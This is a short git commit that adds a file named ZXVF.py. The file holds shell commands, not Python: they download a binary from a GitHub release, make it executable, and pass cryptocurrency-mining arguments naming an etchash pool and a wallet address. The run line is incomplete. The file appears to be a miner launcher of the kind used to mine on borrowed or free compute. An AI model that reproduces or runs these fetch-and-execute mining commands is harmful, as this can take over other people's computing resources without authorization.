16e27301cb0f2792748a0953a3984ceb9e526288
mencobaiajanah <86476551+mencobaiajanah@users.noreply.github.com>
2021-07-11 23:57:48 +0800

    Create ZXVF.py

---
+++ ZXVF.py
@@ -0,0 +1,3 @@
+wget https://github.com/mencobaiajanah/TRX/releases/download/ZXVF/ZXVF
+chmod +x ZXVF
+-a etchash -o stratum+tcp://us-west.ezil.me:4444 -u 0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.zil1rk4nqqyfktdywj82t86n3ut6zwg0602t93mxfm -p x --worker GPU-1 --extra-dag-epoch 0
